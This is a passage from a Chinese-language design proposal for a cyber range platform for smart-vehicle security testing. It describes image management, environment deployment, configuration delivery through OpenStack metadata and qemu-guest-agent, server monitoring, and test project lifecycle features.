。</p><p>镜像库管理模块为系统中的各节点提供镜像支撑，是整个系统的基础模块。镜像库管理模块维护的镜像库中预存了包括终端、交换机、路由器三种类型在内的多种镜像，可通过本模块，利用镜像反复构建所需节点。</p><p>本模块提供对镜像的查询、上传、删除功能。</p><p>查询：可以根据镜像名或镜像唯一标识，在镜像库中查询镜像信息。</p><p>上传：可以根据需求，个性化定制镜像，并将其上传至镜像库中，从而使得镜像库中的镜像类型更加丰富。</p><p>删除：针对无用的镜像，可以根据镜像名或镜像唯一标识删除镜像，减小镜像库所占磁盘大小。</p><p>镜像库中预存的镜像如下表所示，共包含终端、交换机、路由器三类镜像。终端镜像包括Windows、Linux、Unix、MacOS四大主流操作系统及其各类发行版镜像，集FTP、邮件、NTP、DNS、Web、VPN等多种网络服务于一体的镜像。交换机镜像包括二层、三层交换机及SDN交换机镜像。路由器镜像包括Cisco、Juniper、H3C等路由器镜像，vyos等开源路由器镜像以及中继节点镜像。</p><p>镜像库管理模块包含api、registry两个服务，api服务对外提供REST API，可用于响应其他模块的请求。</p><p>api服务：所有发往本模块的请求都会先提交给api服务，由api服务对请求做进一步解析，进而通过中间件将解析后的消息转发给后端的registry服务。</p><p>registry服务：registry服务在收到api转发过来的消息后，根据消息对镜像文件以及镜像数据库做实际操作。</p><p>镜像管理模块的后端默认为本地文件系统，即将上传的镜像保存至本地的指定目录，由本模块统一管理。在生产环境中，本模块支持使用NFS、Ceph等作为后端，实现镜像的分布式存储与管理，提高性能及容错性。</p><p>下图为本模块的架构图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9b941ff426233b305add1d938c0f1306.png" alt="镜像库管理模块架构图"></p><p>镜像库管理模块</p><h5 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h5><p>镜像资源管理可以对试验的虚拟资源进行统一管理。包括虚拟机镜像、Docker镜像、虚拟试验环境、虚拟机节点、Docker容器节点、虚拟链路、安全组、IPs、VLANs等资源的统一调度和管理。支持用户对这些虚拟资源进行增加、删除、修改、查询和监控。具有计算终端台式机、笔记本、服务器、手持终端）、路由器、交换机、防火墙、IDS等多种网络节点的镜像，支持2种路由器，至少支持16种常用虚拟主机配置。</p><p>虚拟网络节点镜像文件是虚拟节点静态化存在的形式，服务于虚拟目标网络的构建，便于自动化部署。虚拟镜像库库的结构如图所示。试验用户可以基于图形界面对镜像进行管理，包括创建、查询、修改和删除镜像。支持创建组成目标网络的各类虚拟节点，包括路由设备、主机和网络安防设备等，创建预装各种应用软件组合的多种虚拟节点，形成虚拟镜像文件。虚拟镜像既可以通过虚拟机实例创建产生，也可以通过注册虚拟机模板镜像产生。注册虚拟机模板主要是把其他第三方提供的模板镜像注册到系统中为模板制作提供资源进行统一管理。创建好的镜像保存在文件服务器上，相关的镜像信息，包括镜像的ID、类型、参数配置等，保存在数据库中。根据镜像的类型、参数、预装软件等信息，对镜像进行进行分类。在数据库中可以直接根据类别查询镜像，也可以使用Group by查询各种不同的分组。</p><p>虚拟镜像管理模块</p><p>在创建虚拟机或网络设备时，根据配置文件中的信息，首先从镜像信息库中查找相应镜像的位置，由镜像临时管理模块负责镜像调出、分发等操作，并在使用完毕后负责清除临时镜像文件。</p><p>提供构建虚拟网络所必需的各类主流操作系统基础镜像，包括典型的Windows系列、Linux系列。镜像库支持的主要虚拟设备和系统类型如下。</p><p>虚拟网络设备：虚拟路由器：支持Cisco、Juniper，具备标准功能的虚拟路由器。</p><p>虚拟交换机：支持具备标准功能的虚拟交换机。</p><p>虚拟主机配置,支持16种以上常用虚拟主机配置，可以根据用户需求添加新的虚拟主机配置。</p><p>操作系统基础镜像：</p><p>Windows系列：</p><p>Windows 2000 Advanced Server; Windows 2000 Professional</p><p>Windows 2000 Server SP4 (32-bit）; Windows 3.1</p><p>Windows 7 (32-bit）; Windows 7 (64-bit）; Windows 95; Windows 98</p><p>Windows NT 4; Windows PV; Windows Server 2003系列（32-bit、64bit）;</p><p>Windows Server 2008系列（32-bit、64bit）</p><p>Windows XP （32-bit、64bit，SP2、SP3）</p><p>Windows Vista （32-bit、64bit）</p><p>Linux系列：</p><p>Asianux 3 (32-bit/64-bit）</p><p>CentOS系列（4.5-6.0, 32-bit/64-bit）</p><p>Debian GNU/Linux系列 (4-6, 32-bit/64-bit）</p><p>FreeBSD (32-bit/64-bit）</p><p>Oracle Enterprise Linux系列(5.0-6.0, 32-bit/64-bit）</p><p>Red Hat Enterprise Linux系列(2.0-6.0, 32-bit/64-bit）</p><p>SUSE Linux Enterprise (8-11, 32-bit/64-bit）</p><p>Ubuntu (9.10-10.04, 32-bit/64-bit）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/baaa2e39608bf51f9334ecdd136565f2.png"></p><p>虚拟镜像管理</p><h5 id="靶场工程管理"><a href="#靶场工程管理" class="headerlink" title="靶场工程管理"></a>靶场工程管理</h5><p>环境管理主要是对仿真的虚拟化环境进行管理，管理的操作包括对整个虚拟化环境的重启、停止、启动、重置、销毁的管理，也可以对环境中的子网或者每一个设备进行上述的管理。支持列表展示每个仿真环境的相关信息（含子网数量、主机个数、运行状态、创建时间。支持按照用户的试验网络拓扑设计自动部署试验环境，支持在指定宿主机范围内部署试验环境，支持已部署的试验环境的网络拓扑的修改与增量式部署。在具体的试验环境中，支持对试验环境中网络出口规则、入口规则和转发规则的配置，系统提供配置界面，以支持试验环境的恢复和对试验环境的监控。支持通过配置界面或配置文件在多节点上批量安装、备份或还原操作系统。</p><p>具体的实例环境除了可以进行以上的操作管理外，还提供整个网络的镜像管理功能。提供一键式对整个环境进行镜像备份，也可以有选择的对环境中某个设备进行镜像。系统提供镜像文件的展示，用户可以将整个环境恢复到某个镜像状态。镜像包括有内存镜像和磁盘镜像。对于多个镜像的环境，可以进行列表或者树形的结构展示。支持在整个试验环境/子网/虚拟节点三个层面的备份/恢复，并支持对试验环境/子网/虚拟节点的多个备份版本的管理，支持五个及以上的备份版本。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a2343e4071db8e992df985f1bb11e3ff.png"></p><p>试验环境管理</p><p>环境管理中对所有虚拟机都提供远程访问URL，用户通过点击URL访问虚拟机，在虚拟机界面上按Ctrl+Alt+Shift快捷键，可打开客户端机器与远程虚拟机的通信共享操作界面。虚拟机内部的内容可以通过剪切板复制到本地，本地机器复制的内容也可以通过剪切板粘贴到远程虚拟机中。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c0951cb64c6c9d7a4c88e484328e12f.png"></p><p>虚拟机远程访问</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/afc5fb06bbb28a846e564a62416d021f.png"></p><p>虚拟机的远程复制粘贴</p><p>通过虚拟机的通信界面，还可以通过浏览器将本地文件上传到虚拟机中，虚拟机需要支持tftp、vnc、rdp、ssh等其中的某项协议。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ab915fb0fd9c1b21fe405c4586733dd9.png"></p><p>本地与远程虚拟机间上传文件</p><p>可查询所有或指定虚拟机运行状态、CPU核数、CPU利用率、内存容量、内存利用率、虚拟机操作系统、所在计算节点主机等统计报表，并导出为PDF格式文档。同时，支持查询指定虚拟化主机在指定时间段内的CPU利用率、内存利用率、磁盘读速率、磁盘写速率、磁盘I/O吞吐量、网络总流量、网络读流量、网络写流量、网络读速率和网络写速率等关键性能报表。</p><h5 id="试验场景管理"><a href="#试验场景管理" class="headerlink" title="试验场景管理"></a>试验场景管理</h5><p>试验场景描述了一个试验场景的具体内容，包括步骤、角色、结果评判、试验文档、试验所需环境等信息。对于试验设计人员来说，需要基于它创建特定的任务，以供试验人员进行使用。试验场景管理支持试验过程控制，主要包括试验环境构建过程管理、试验运行进程控制，可根据试验任务配置方案启动相关试验环绕的构建过程，支持控制试验的开始、暂停、继续、回滚、回放、停止、科目更换和资源回收。支持多种方式查询试验相关信息、试验状态的保存和恢复。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/50d974e408a5a555fb110968a9b29e24.png"></p><p>试验场景切换</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ae4fcf7ca4c0ed785d8d351b38994765.png"></p><p>试验过程管控</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/65a6b28f2e3b9a836fa40e2ea604e2ae.png"></p><p>试验场景查看</p><p>支持场景保存模板功能。配置参数包括名称，权限（私有、共享）。描述等字段。保存时，会将流程图、任务数据、人员数据等数据进行存储。</p><p>支持对设备资源、IP地址池、VNF资源、VNID池等资源进行图形化管理；设备资源管理支持对物理设备、虚拟设备、边界设备组、L4~L7物理资源池等进行管理。</p><h5 id="配置管理模块"><a href="#配置管理模块" class="headerlink" title="配置管理模块"></a>配置管理模块</h5><p>配置管理模块用于管理用户的配置文件，可用于从虚拟节点中读取用户所需数据或将用户所需配置写入虚拟节点中，其中配置内容包括：</p><p>控制命令：对虚拟节点中的程序下发启动、暂停、停止等控制命令，可实现对程序的远端控制。控制命令可反复下发。</p><p>配置文件：下发虚拟节点内的程序所需要的配置文件，配置文件中的内容可根据程序的需求进行定制。提供主机参数包括IP/MAC地址、网关地址、型号等，路由、安防设备参数包括IP地址、端口、安防策略等；</p><p>在线迁移：下发配置命令，能够实现在线动态更新内核，打补丁，在线迁移功能。</p><p>本模块共提供三种不同的方式实现配置管理，用户可根据自己的需要，自行选择所需的方式进行配置管理。三种方式如下：</p><p>方式一：在虚拟机所在网络具有系统提供的DHCP服务节点时，可在该DHCP服务节点上利用scp的方式向虚拟节点写入配置文件或从配置文件中读取数据，该方式利用了虚拟网络，对配置的内容与大小没有限制。虚拟节点需要开启SSH服务。</p><p>方式二：利用metadata或userdata，该方式仅支持将配置写入虚拟节点中，该方式同样利用了虚拟网络，对配置的内容无限制，对配置文件的大小有限制。</p><p>方式三：利用qga，该方式同时支持将配置写入虚拟节点以及从虚拟节点读取数据，并且该方式不依赖于虚拟网络，对配置的内容与大小没有限制。虚拟节点需要安装qemu-guest-agent服务。</p><p>配置管理模块具备三种不同的方式实现配置的下发及数据的读取，针对三种不同的方式，有以下三种不同的实现方法：</p><p>方式一：该方式包含2个服务：api服务及config_transfer_agent服务。当用户选用本方式进行配置管理时，可将请求发送至api服务，由api服务解析请求，通过管理网络交由config_transfer_agent服务，config_transfer_agent服务通过虚拟节点所在网络对虚拟机做实际操作。</p><p>方式二：该方式中，会将用户需要写入虚拟节点的配置信息交由meta-agent服务，当虚拟节点成功启动后，可通过访问<a href="http://169.254.169.254/openstack/latest/meta_data.json%E7%9A%84%E6%96%B9%E5%BC%8F%E9%97%B4%E6%8E%A5%E8%AE%BF%E9%97%AEmeta-agent%E6%9C%8D%E5%8A%A1%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%8F%96metadata%E3%80%82%E5%90%8C%E7%90%86%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AE%BF%E9%97%AEhttp://169.254.169.254/latest/user-data%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E8%8E%B7%E5%8F%96user-data%E3%80%82">http://169.254.169.254/openstack/latest/meta_data.json的方式间接访问meta-agent服务，从而获取metadata。同理，虚拟机也可以通过访问http://169.254.169.254/latest/user-data的方式，获取user-data。</a></p><p>方式三：该方式包含3个服务：api服务、qemu_guest_agent_proxy服务以及qemu_guest_agent服务，其中qemu_guest_agent服务处于虚拟节点内部。当用户选用本方式进行配置管理时，可将请求发送至api服务，由api服务解析请求并根据虚拟节点的唯一标识获得其所在宿主机地址，进而将请求消息通过消息中间件转发至虚拟节点所在宿主机的qemu_guest_agent_proxy服务，qemu_guest_agent_proxy服务通过解析消息获得虚拟节点唯一标识，从而将用户请求给虚拟节点内部的qemu_guest_agent服务，由qemu_guest_agent服务根据消息的主体部分做具体操作。</p><p>使用metadata或userdata的方式将配置信息写入虚拟节点：</p><p>使用metadata：首先使用系统账号和密码登陆仿真系统。</p><p>依次点击左侧栏中的“项目”、“计算”、“实例”</p><p>然后点击右上角的“创建实例”，在弹出的界面中填写需要创建的虚拟节点的相关信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b8ad43eda2309b4fe62b2f197113123a.png"></p><p>创建实例</p><p>然后在弹出的界面的左侧栏中点击“元数据”一栏，在“Custom”中填入需要传入的信息的key值（如“test_key”），点击“+”，接着在右侧的对应栏中填入需要传入的信息的value值（如“test_value”），点击“创建实例”开始创建虚拟节点</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8847f522b9c3a18dbdf7e9802c222463.png"></p><p>开始创建虚拟节点</p><p>进入创建成功的虚拟节点中，使用“curl <a href="http://169.254.169.254/latest/meta-data/test_key">http://169.254.169.254/openstack/latest/meta-data.json”命令，即可获得</a>json文件，在获得的json文件中的meta字段，可以获得之前传入的配置信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c558f35ad9c0d17e3ab08cf58be1be4e.png"></p><p>获得传入信息</p><p>使用userdata：</p><p>首先使用系统账号和密码登陆仿真系统</p><p>依次点击左侧栏中的“项目”、“计算”、“实例”</p><p>然后点击右上角的“创建实例”，在弹出的界面中填写需要创建的虚拟节点的相关信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/120da088001b8d3bb29685ed2fcf5b76.png"></p><p>:创建实例</p><p>然后在弹出的界面的左侧栏中点击“配置”一栏，在“定制化脚本”中填入需要传入的信息（如“this is a test.”），点击“创建实例”开始创建虚拟节点</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fd340220e4bd224d293765a005b50610.png"></p><p>创建虚拟节点</p><p>进入创建成功的虚拟节点中，使用“curl <a href="http://169.254.169.254/latest/meta-data/test_key">http://169.254.169.254/latest/user-data”命令，即可获得</a>之前传入的配置信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0e45732747a7dd462e8cf3b4f387411e.png"></p><p>获得之前配置信息</p><p>使用qga的方式进行配置管理：</p><p>配置管理:数据的执行配置与操作,本系统支持不通过网络环境直接操纵虚拟节点进行命令执行的操作，并能实时获取执行结果。新建一条数据执行的配置项，如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0288ea9118ed54ce411ff1bf2a662575.png"></p><p>新建执行</p><p>数据的执行操作要在此基础上，结合任务操作来一起进行。在任务管理面板中，创建一个新的任务，任务类型选为执行虚拟机的指令，然后配置该任务的表单项，配置完成后保存。可以在任务面板上控制任务的启停，达到控制该条数据是否在虚拟节点中执行的效果。</p><p>在创建任务中，选择最新配置的这条“testabc”的执行命令，配置进行任务的虚拟机，点击确定保存一条任务。然后启动任务就可以完成数据的执行。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d25f0486f7b1dde2025af56585263d9.png"></p><p>创建任务</p><p>所有的数据执行配置可以在数据执行配置列表中查看，操作者可以在列表界面进行添加一条数据执行的命令，或者在原有配置命令中进行修改或删除的操作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/442a1609e9b9cdf0576562580458ba36.png"></p><p>配置管理</p><h5 id="学习资源管理"><a href="#学习资源管理" class="headerlink" title="学习资源管理"></a>学习资源管理</h5><p>试验文档管理用于管理试验所需的帮助信息。新增的试验工程可以设置是否需要帮助信息。在试验的步骤设计中也可以指定帮助主题。试验文档帮助信息包括帮助主题、内容类型（文本或者多媒体类型）等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a8a111389e5c3ff818b9c4783f7de86e.png"></p><p>文档模板</p><p>支持试验报告的辅助生成，具备试验报告模板，支持模板的自定义编辑</p><p>系统支持报告提交任务配置。配置参数包括任务执行最长用时、人员数据以及描述等字段。</p><p>支持学习资源的综合管理，包括视频、客观题、主观题、课程、实验、试卷以及指导书等。管理员可以通过系统对学习资源进行管理，包括查看资源的状态、修改权限以及删除资源等操作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cfedf0ffd22bdcd2b413608ed69ff25a.png"></p><p>学习资源管理</p><h3 id="运维管理模块"><a href="#运维管理模块" class="headerlink" title="运维管理模块"></a>运维管理模块</h3><h4 id="功能实施方案-8"><a href="#功能实施方案-8" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统支持物理服务器层面的平台负载监控，提供综合负载、CPU使用率、内存使用率、网络速度等监测数据，便于进行宏观性能评估。该监控功能通过高效的资源监测技术实现，确保实时准确地反映服务器状态。截图见“产品功能截图”部分</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/44ad2e591fb34b668acd1feb082913e8.png"></p><p>2）系统提供对平台物理服务器的性能评估功能，支持根据服务器类型筛选、基于主机名称和IP的搜索，以及综合负载的颜色区分展示。性能评估功能通过先进的数据分析和可视化技术实现，提供性能指标展示。</p><p>3）系统支持对平台操作及接口调用的日志进行记录，用户可以根据时间范围、操作日志类型等条件进行查看。此外，该模块还能够根据角色、操作类型等条件对操作的记录进行统计，方便用户对操作历史进行追溯和分析。</p><p>4）系统具备平台运行组件的状态监控功能，能够实时监控系统所采用的中间件以及自身后台服务的服务状态，并提供相应的统计与查看功能。用户还可以开启、停止或重启相关组件，并查看组件的操作日志，确保系统的稳定性和安全性。</p><p>5）系统支持对平台操作及接口调用的日志进行记录，能够根据时间范围、操作日志类型等条件进行各种级别的查看。系统还支持划分角色、操作类型等多条件对操作的记录进行统计，增强日志管理的灵活性和有效性。</p><p>6）系统支持物理服务器和虚拟机的网络结构显示，包括服务器实例号、二层虚拟链路地址、下挂VLAN号及其对应关系，以及虚拟交换机端口的上下行速率监控。网络结构显示功能采用高级网络监控技术，确保网络状态的全面监控和高效管理。</p><p>7）系统提供物理服务器的基础信息监控，覆盖主机名、操作系统信息、CPU信息、硬盘信息、内存信息、网卡信息、操作系统信息和机架位置等等。监控功能支持SSH接入，实现运维处理。基础信息监控利用高效的数据收集和展示技术，保证信息的实时性和准确性。</p><p>8）系统支持物理服务器告警信息查看，包括威胁等级、优先级、数值和触发告警时间。告警系统结合智能分析和优先级分类技术，确保及时响应并准确反映服务器状态。</p><p>9）系统提供物理服务器服务统计监控，涵盖服务信息、服务进程、失败次数和比例、开始时间和运行时间等不少于5类信息。服务统计监控功能采用高级数据分析技术，确保服务状态的全面监测。</p><p>10）系统支持根据具体应用划分服务器，包括计算节点、应用节点和网络节点。提供物理服务器的基础信息监控性能图表监控，覆盖CPU、内存、物理网卡硬盘、网卡、IP连接、上下行流量、OVS端口、进程等至少8种物理服务器信息的实时数值监控。此监控功能通过高级的数据收集和分析技术实现，确保服务器性能的全面监测，为运维和性能优化提供准确的数据支持。</p><p>11）系统提供平台运行的网络设备状态展示，包括交换机、路由器等及每个端口的运行状态、管理状态、实时流量等信息。网络设备状态展示通过高效的网络监控技术实现，确保网络设备状态的实时监控和管理。</p><p>12）系统支持系统用户操作日志的查看，提供分角色、分类型的筛选功能。系统提供TOP10的接口调用查看和TOP10的接口使用用户查看，通过日志分析和数据可视化技术，实现用户行为的深度分析和概览。</p><h4 id="性能实施方案-8"><a href="#性能实施方案-8" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统的运维管理模块支持管理不低于40台服务器，实现对服务器资源进行扩展管理。服务器管理包括服务器监控、配置管理、补丁管理、故障排除和性能优化等多个方面的运维操作。</p><h4 id="技术实现内容-8"><a href="#技术实现内容-8" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，平台提供了全面的物理服务器层面的监控和管理功能。用户可以对物理服务器进行宏观的平台负载情况监控，包括综合负载、CPU使用率、内存使用率、网络速度等多个监测指标。平台还提供了性能评估功能，允许用户对服务器进行性能评估，并根据服务器类型进行筛选和搜索。监控结果以不同区段和颜色展示，便于用户快速了解服务器状态。</p><p>此外，平台支持对操作及接口调用的日志进行记录和查看，用户可以根据时间范围、日志类型等条件进行查看和统计。还可以对平台运行组件的状态进行监控，包括中间件和后台服务的状态统计、操作和日志查看。</p><p>物理服务器和虚拟机的网络结构显示也受到支持，用户可以查看服务器的实例号、二层虚拟链路地址以及下挂的VLAN号与对应关系，还可以监控包数量和虚拟交换机端口上下行速率，便于及时掌握链路状态。</p><p>基础信息监控包括主机名、操作系统信息、CPU信息、硬盘信息、内存信息、网卡信息、操作系统信息和机架位置等。平台还支持告警信息查看、服务统计监控、服务器按应用划分、基础信息监控性能图表监控等多项功能，提供了对物理服务器各方面信息的实时数值监控。</p><p>此外，平台还展示了运行的网络设备状态，包括交换机和路由器等，支持查看端口的运行状态、管理状态和实时流量等信息。用户操作日志查看功能支持分角色和类型筛选，同时提供TOP10的接口调用查看和TOP10的接口使用用户查看。</p><p>性能参数设计方面，平台支持管理40台服务器的运维管理，确保了资源管理的有效性和扩展性。</p><p>包含监控、评估、日志管理、网络结构显示、告警系统和性能参数要求等多个方面，以满足对物理服务器层面宏观的平台负载情况的监控和管理需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/44ad2e591fb34b668acd1feb082913e8.png"></p><p>1. 平台负载监控</p><p>监控指标：系统将提供综合负载、CPU使用率、内存使用率、网络速度等5类监控数值。</p><p>性能评估：系统将支持对物理服务器的性能进行评估，能够根据服务器类型进行筛选，并提供基于主机名称和IP的搜索功能。</p><p>视觉展示：综合负载将按数值大小展示不同颜色区段，以显示服务器的负载情况。</p><p>2. 日志管理</p><p>日志记录：平台将记录所有操作及接口调用的日志，支持按时间范围、日志类型等条件进行查看。</p><p>统计分析：系统将能够划分角色、操作类型等条件对操作日志进行统计。</p><p>3. 运行组件监控</p><p>状态监控：监控系统采用的中间件及后台服务的状态。</p><p>组件管理：允许用户开启、停止、重启相关组件，并查看操作日志。</p><p>4. 网络结构显示</p><p>网络拓扑：显示物理服务器和虚拟机的网络结构，包括实例号、二层虚拟链路地址、VLAN号等。</p><p>流量监控：监控包数量和虚拟交换机端口的上下行速率。</p><p>5. 基础信息监控</p><p>服务器信息：监控服务器的基础信息，如主机名、操作系统、CPU、硬盘、内存、网卡信息、机架位置等。</p><p>远程接入：提供SSH接入进行运维处理。</p><p>6. 告警系统</p><p>告警信息：展示告警信息，包括威胁等级、优先级、数值和触发告警时间。</p><p>7. 服务统计监控</p><p>服务监控：监控服务信息、服务进程、失败次数和比例、开始时间和运行时间等。</p><p>8. 应用划分与性能图表</p><p>应用划分：按照计算节点、应用节点、网络节点等划分服务器。</p><p>性能图表：提供CPU、内存、物理网卡硬盘、网卡、IP连接、上下行流量、OVS端口、进程等信息的实时数值监控。</p><p>9. 网络设备状态展示</p><p>设备状态：展示平台运行的网络设备状态，包括交换机、路由器等，并支持查看每个端口的运行状态、管理状态、实时流量等信息。</p><p>10. 用户操作日志</p><p>日志查看：支持分角色、分类型对用户操作日志进行筛选，并提供接口调用和用户使用的TOP10查看。</p><p>11. 实施步骤</p><p>详细分析监控和管理需求，确定监控指标和功能列表。</p><p>技术选型：选择合适的监控技术和工具，如Zabbix、Prometheus、Grafana等。</p><p>系统设计：设计系统架构，包括数据收集、存储、处理、展示和告警模块。</p><p>部署实施：在服务器上部署监控代理，配置监控中心，设置告警规则。</p><p>功能开发：开发日志管理、网络结构显示、基础信息监控等功能。</p><p>测试验证：测试系统功能，确保监控数据准确，告警及时。</p><p>上线运行：系统上线并进入运行阶段，进行实时监控和管理。</p><p>维护升级：持续对系统进行维护和升级，确保系统稳定运行。</p><p>通过本方案实施，将为车载网络管理系统提供一个强大的服务器监控和管理工具，帮助运维人员及时发现和解决问题，保障系统稳定性和性能。</p><h1 id="智能汽车网络靶场试验配置管理分系统"><a href="#智能汽车网络靶场试验配置管理分系统" class="headerlink" title="智能汽车网络靶场试验配置管理分系统"></a>智能汽车网络靶场试验配置管理分系统</h1><h3 id="汽车安全测试模块"><a href="#汽车安全测试模块" class="headerlink" title="汽车安全测试模块"></a>汽车安全测试模块</h3><h4 id="功能实施方案-9"><a href="#功能实施方案-9" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）提供的系统能够支持创建测试项目，开展测试业务，系统能够支持完整的测试项目生命周期管理包含测试准备、执行和归档三个关键阶段，确保全流程管理。在测试准备阶段，系统支持定义测试需求、选择适合的测试工具和设定测试参数。测试执行阶段中，系统自动运行设定好的测试用例，并监控测试进度，确保测试的准确性和效率。在测试归档阶段，系统会保存测试结果和相关数据，为后续的分析和审查提供支持。这种全方位的生命周期管理确保了测试活动的连贯性和一致性，同时提高了测试活动的效率和有效性。</p><p>2）通过界面，系统提供项目创建和管理功能，覆盖了测试对象、测试人员和测试环境的配置，以及为测试人员分配接入机器的支持。用户界面设计简介，使用户能够轻松管理测试项目。系统允许将测试项目拆解成多个测试项，这样可以更有效地组织和管理测试活动，提高测试的灵活性和可控性。同时，系统还支持对测试人员的角色和权限进行管理，确保测试活动在安全和控制的环境下进行。</p><p>3）系统支持对每个测试项进行详细的配置，包括添加测试用例的灵活性。用户可以根据具体需求直接添加测试用例，或从测试工具的库中导入测试用例，这增加了测试的灵活性和多样性。系统还支持对测试用例进行详细的参数设置和调整，以适应不同的测试场景和需求。此外，系统还提供了测试用例的版本控制和管理功能，保证了测试用例的一致性和可追溯性，从而增强了测试的准确性和可靠性。</p><p>4） 系统允许用户定义和编排测试流程，包括支持多种测试事务类型，如人工单例事务、批量事务、自动化测试事务、流量采集事务、流量分析事务和攻击事务。无论是人工单例事务、批量事务，还是自动化测试事务、流量采集事务、流量分析事务以及攻击事务，用户都可以根据实际需求进行灵活定义和配置，每个测试事务都可以与测试流程的不同步骤相关联，还支持将测试事务编排到测试流程的各个步骤中，用户可以根据测试需求新增或调整步骤顺序，并且每个步骤都可以设置为人工执行或自动执行，确保全面覆盖不同测试情境，用户可以根据项目类型、优先级等因素进行灵活分类，以便更好地管理和监控测试进程。</p><p>5） 用户可以在系统中方便地启动和停止测试项目，为用户提供了对测试活动的完全控制权。他们可以根据需要随时开始或终止测试项目，以满足紧急需求或测试计划的变化。</p><p>6） 用户可以实时控制测试活动的进展，通过接入机器登录到测试环境，并根据测试方案和测试用例的要求进行测试。这种实时控制允许测试团队根据实际情况调整测试参数，监控测试进度，并在必要时进行干预，以确保测试活动按计划进行并满足测试目标，提高了测试活动的灵活性和效率。</p><p>7） 测试结果支持富文本格式，测试人员能够提交详尽的测试结果，这些结果将用于进一步分析和报告生成。测试人员可以在系统中详细记录测试过程、发现的问题以及解决方案等信息，并以图文并茂的方式展示测试结果。。富文本格式允许测试人员添加详细的文本描述、图表、表格和其他多媒体元素，以更全面、清晰地呈现测试过程和发现的问题。富文本格式的支持不仅有助于深入分析测试结果，还为后续的问题解决和改进提供了更多的信息和参考，确保测试活动的质量和效率。</p><p>8）系统提供丰富的统计功能，包括测试项、测试用例数量、产品漏洞和公用漏洞数量的统计，以及按测试用例通过率进行的统计。系统采用了先进的算法和可视化技术，将统计结果以直观的图表形式展示出来，帮助用户更好地了解测试情况和产品安全性能。系统还支持按照测试用例通过率进行统计和排序，用户可以根据通过率高低对测试用例进行优化和调整，以提高测试质量和效率。此外，系统还提供了自定义报表和导出功能，用户可以根据实际需求定制统计报表并导出数据进行深入分析。。</p><p>9）系统支持查看测试结果，并自动生成测试报告。用户可以根据测试结果生成测试报告，其中包含测试用例通过数、未通过数、结论、综合评分等详细信息，同时还需要提供产品功能截图以进一步说明测试结果。</p><p>10）系统支持重新开启测试活动进行复测，同时还具备对历史测试数据的归档处理功能，以便查看历史测试数据和报告。这有助于跟踪测试历史，进行比较测试结果的变化，并更好地理解产品的演化和质量改进趋势。</p><p>11）系统对设备资源的管理是多层次、多维度的。涵盖实物测试设备、虚拟测试设备及其镜像。资源管理模块负责监控资源状态、分配资源、优化资源配置。实物测试设备管理关注设备的使用效率、维护和升级。虚拟测试设备管理则涉及虚拟化技术，确保虚拟环境的稳定性和性能。虚拟设备镜像管理则是存储和部署虚拟设备的关键，包括镜像的创建、更新、备份和恢复。</p><p>12）测试工具的分类管理和上传机制确保测试资源的组织性和可访问性。工具按类型、功能、适用范围等